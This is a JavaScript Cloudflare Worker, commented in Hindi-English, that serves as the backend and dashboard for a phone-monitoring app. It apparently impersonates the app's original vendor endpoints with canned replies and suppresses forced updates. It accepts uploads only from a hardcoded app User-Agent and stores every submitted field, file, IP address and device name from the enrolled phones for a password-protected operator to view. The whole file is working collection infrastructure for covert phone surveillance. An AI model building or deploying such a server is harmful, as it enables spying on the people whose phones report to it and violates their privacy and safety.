// Guardian Panel — API Worker with LOGIN SYSTEM
// UI: public/index.html (auth ke baad), public/login.html (login page)
// APK ke liye: POST endpoints khule hain lekin sirf asli APK ka User-Agent accept hota hai.
//   Data uploads      -> EXACT text "ok"
//   user/loginUser.php        -> {"status":"ok","idClient":1}
//   user/verifPhone.php       -> {"status":"ok","nbPhone":0}
//   user/savePhone.php        -> {"status":"ok","idPhone":1}
//   user/getLastVersionApp.php-> {"forceUpdateApp":"false"}
// Password repo mein NAHI hai — sirf SHA-256 hash hai (repo public hai).
// Naya password chahiye to naya hash banao aur PASS_HASH badlo.

var captures = [];
var MAX_CAPTURES = 2000;
var PASS_HASH = "86f1672bb6586732adac9bc70e357457bfe50c1dd20cdcbcf82476f6a0d0a3d5";
var SESSION_DAYS = 30;
var APK_UA = "ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019";

// Per-device system: har phone ko activation pe UNIQUE idPhone milta hai.
// Phone har request mein apna idPhone bhejta hai -> dashboard alag-alag dikhata hai.
var deviceSeq = 0; // next idPhone to assign
var deviceNames = {}; // idPhone -> setup mein diya gaya phone naam
var namesLoaded = false;

async function loadNames() {
  if (namesLoaded) return;
  namesLoaded = true;
  if (typeof KV_DATA === "undefined" || !KV_DATA) return;
  try {
    var raw = await KV_DATA.get("dev:names");
    if (raw) {
      deviceNames = JSON.parse(raw) || {};
      var mx = 0;
      for (var id in deviceNames) {
        var n = parseInt(id, 10);
        if (n > mx) mx = n;
      }
      deviceSeq = mx;
    }
  } catch (e) {
    // KV fail -> in-memory only
  }
}

async function saveNames() {
  if (typeof KV_DATA === "undefined" || !KV_DATA) return;
  try {
    await KV_DATA.put("dev:names", JSON.stringify(deviceNames));
  } catch (e) {
    // ignore
  }
}

addEventListener("fetch", function (event) {
  event.respondWith(handle(event.request));
});

function corsHeaders() {
  return {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };
}

function jsonResp(obj, status) {
  return new Response(JSON.stringify(obj), {
    status: status || 200,
    headers: Object.assign({ "content-type": "application/json; charset=utf-8" }, corsHeaders()),
  });
}

/* ---------- auth helpers ---------- */
function b64url(u8) {
  var s = "";
  for (var i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

async function sha256Hex(text) {
  var buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  var u8 = new Uint8Array(buf);
  var out = "";
  for (var i = 0; i < u8.length; i++) out += (u8[i] < 16 ? "0" : "") + u8[i].toString(16);
  return out;
}

async function signSession(expStr) {
  var key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(PASS_HASH),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  var sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(expStr));
  return b64url(new Uint8Array(sig));
}

async function makeSessionToken() {
  var exp = String(Date.now() + SESSION_DAYS * 24 * 3600 * 1000);
  var sig = await signSession(exp);
  return exp + "." + sig;
}

async function hasValidSession(request) {
  try {
    var ck = request.headers.get("Cookie") || "";
    var m = ck.match(/(?:^|;\s*)gp_session=([^;]+)/);
    if (!m) return false;
    var parts = m[1].split(".");
    if (parts.length !== 2) return false;
    var exp = parseInt(parts[0], 10);
    if (!exp || exp < Date.now()) return false;
    var sig = await signSession(parts[0]);
    return sig === parts[1];
  } catch (e) {
    return false;
  }
}

/* ---------- assets ---------- */
async function serveAsset(origin, targetPath) {
  if (typeof ASSETS === "undefined" || !ASSETS) {
    return new Response("Dashboard files not configured (assets missing)", { status: 500 });
  }
  try {
    return await ASSETS.fetch(new Request(origin + targetPath));
  } catch (e) {
    return new Response("Asset error: " + String(e), { status: 500 });
  }
}

/* ---------- file serving (KV) ---------- */
async function serveFile(key) {
  if (typeof KV_DATA === "undefined" || !KV_DATA) {
    return jsonResp({ error: "KV_DATA not connected" }, 404);
  }
  if (!key || key.indexOf(":") >= 0) {
    return jsonResp({ error: "bad key" }, 400);
  }
  try {
    var metaRaw = await KV_DATA.get("m:" + key);
    var data = await KV_DATA.get("f:" + key, "arrayBuffer");
    if (!data) {
      return jsonResp({ error: "not found" }, 404);
    }
    var meta = { type: "application/octet-stream", name: key };
    if (metaRaw) {
      try {
        meta = JSON.parse(metaRaw);
      } catch (e) {
        // keep default meta
      }
    }
    return new Response(data, {
      status: 200,
      headers: Object.assign(
        {
          "content-type": meta.type || "application/octet-stream",
          "content-disposition": 'inline; filename="' + String(meta.name || key) + '"',
          "cache-control": "public, max-age=86400",
        },
        corsHeaders()
      ),
    });
  } catch (e2) {
    return jsonResp({ error: String(e2) }, 500);
  }
}

/* ---------- main router ---------- */
async function handle(request) {
  var url = new URL(request.url);
  var method = request.method;
  var path = url.pathname;

  if (method === "OPTIONS") {
    return new Response(null, { status: 204, headers: corsHeaders() });
  }

  // ---------- LOGIN (no auth needed) ----------
  if (path === "/api/login" && method === "POST") {
    try {
      var loginBody = await request.json();
      var inputHash = await sha256Hex(String(loginBody.password || ""));
      if (inputHash === PASS_HASH) {
        var tok = await makeSessionToken();
        return new Response(JSON.stringify({ ok: true }), {
          status: 200,
          headers: Object.assign(
            {
              "content-type": "application/json; charset=utf-8",
              "Set-Cookie":
                "gp_session=" + tok + "; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=" + (SESSION_DAYS * 24 * 3600),
            },
            corsHeaders()
          ),
        });
      }
      return jsonResp({ ok: false, error: "wrong password" }, 401);
    } catch (e) {
      return jsonResp({ ok: false, error: "bad request" }, 400);
    }
  }

  // ---------- LOGOUT (clears cookie) ----------
  if (path === "/api/logout" && method === "POST") {
    return new Response(JSON.stringify({ ok: true }), {
      status: 200,
      headers: Object.assign(
        {
          "content-type": "application/json; charset=utf-8",
          "Set-Cookie": "gp_session=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0",
        },
        corsHeaders()
      ),
    });
  }

  // ---------- Dashboard API (auth required) ----------
  if (path.indexOf("/api/") === 0) {
    var authed = await hasValidSession(request);
    if (!authed) {
      return jsonResp({ error: "unauthorized" }, 401);
    }
    if (path === "/api/captures" && method === "GET") return jsonResp(captures);
    if (path === "/api/clear" && method === "POST") {
      captures = [];
      return jsonResp({ ok: true, message: "cleared" });
    }
    if (path === "/api/health" && method === "GET") {
      return jsonResp({ ok: true, captures: captures.length, time: new Date().toISOString() });
    }
    if (path.indexOf("/api/file/") === 0 && method === "GET") {
      return serveFile(path.slice("/api/file/".length));
    }
    return jsonResp({ error: "not found" }, 404);
  }

  // ---------- APK capture (POST, khule hain lekin sirf asli APK UA) ----------
  if (method === "POST") {
    var ua = request.headers.get("user-agent") || "";
    if (ua.indexOf(APK_UA) < 0) {
      // Random spam bots yahan ruk jayenge — sirf APK ke requests capture hote hain
      return jsonResp({ error: "forbidden" }, 403);
    }

    var p = url.pathname;
    var capPromise = capturePost(request, url);

    return capPromise.then(async function (cap) {
      var f = (cap && cap.fields) || {};

      if (p === "/user/loginUser.php") {
        return jsonResp({ status: "ok", idClient: 1 });
      }
      if (p === "/user/verifPhone.php") {
        // Naam pehle se kisi aur device ne liya hai to nbPhone:1 -> app naam ke aage _1 lagayegi
        await loadNames();
        var wantName = String(f.namePhone || "");
        var exists = 0;
        if (wantName !== "") {
          for (var id in deviceNames) {
            if (String(deviceNames[id]) === wantName) {
              exists = 1;
              break;
            }
          }
        }
        return jsonResp({ status: "ok", nbPhone: exists });
      }
      if (p === "/user/savePhone.php") {
        // NAYA device -> unique idPhone assign karo (2 phone = 2 alag ID, data mix nahi hoga)
        await loadNames();
        deviceSeq = deviceSeq + 1;
        var newId = deviceSeq;
        deviceNames[String(newId)] = String(f.namePhone || "") || "Device-" + newId;
        await saveNames();
        return jsonResp({ status: "ok", idPhone: newId });
      }
      if (p === "/user/getLastVersionApp.php") {
        return jsonResp({ forceUpdateApp: "false", lastVersion: "525" });
      }
      return new Response("ok", {
        status: 200,
        headers: Object.assign({ "content-type": "text/plain; charset=utf-8" }, corsHeaders()),
      });
    });
  }

  // ---------- GET routing (auth ke saath) ----------
  if (method === "GET") {
    var authedGet = await hasValidSession(request);

    if (authedGet) {
      if (path === "/" || path === "/index.html") return serveAsset(url.origin, "/index.html");
      if (path === "/login") return Response.redirect(url.origin + "/", 302);
      return Response.redirect(url.origin + "/", 302);
    }

    // Not logged in
    if (path === "/login" || path === "/login.html") {
      return serveAsset(url.origin, "/login.html");
    }
    return Response.redirect(url.origin + "/login", 302);
  }

  return new Response("Not found", { status: 404, headers: corsHeaders() });
}

/* ---------- capture ---------- */
async function capturePost(request, url) {
  await loadNames();
  var fields = {};
  var files = [];
  var bodyPreview = "";

  try {
    var ct = request.headers.get("content-type") || "";

    if (ct.indexOf("multipart/form-data") === 0) {
      var form = await request.formData();
      var entries = [];
      form.forEach(function (value, key) {
        entries.push([key, value]);
      });
      for (var i = 0; i < entries.length; i++) {
        var key = entries[i][0];
        var value = entries[i][1];
        var isFile = value && typeof value === "object" && typeof value.arrayBuffer === "function";
        if (isFile) {
          var meta = {
            name: value.name,
            type: value.type || "application/octet-stream",
            size: value.size,
            fileKey: null,
          };
          if (typeof KV_DATA !== "undefined" && KV_DATA && value.size <= 20971520) {
            try {
              var fkey = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
              await KV_DATA.put("f:" + fkey, await value.arrayBuffer());
              await KV_DATA.put("m:" + fkey, JSON.stringify(meta));
              meta.fileKey = fkey;
            } catch (e2) {
              // KV fail -> metadata only
            }
          }
          files.push(meta);
          fields[key] = "[file] " + value.name;
        } else {
          fields[key] = String(value);
        }
      }
    } else {
      var text = await request.text();
      bodyPreview = String(text).slice(0, 4000);
      try {
        var params = new URLSearchParams(text);
        params.forEach(function (v, k) {
          fields[k] = v;
        });
      } catch (e3) {
        // not form-urlencoded -> keep raw body only
      }
    }
  } catch (e) {
    bodyPreview = "[parse error] " + String(e);
  }

  var deviceId = null;
  var deviceName = null;
  var fid = fields.idPhone;
  if (fid !== undefined && fid !== null && fid !== "") {
    deviceId = String(fid);
    deviceName = deviceNames[deviceId] || null;
  }

  var cap = {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
    time: new Date().toISOString(),
    path: url.pathname,
    query: Object.fromEntries(url.searchParams),
    fields: fields,
    files: files,
    body: bodyPreview,
    ip: request.headers.get("cf-connecting-ip") || "",
    ua: request.headers.get("user-agent") || "",
    deviceId: deviceId,
    deviceName: deviceName,
  };

  captures.unshift(cap);
  if (captures.length > MAX_CAPTURES) {
    captures.pop();
  }
  return cap;
}
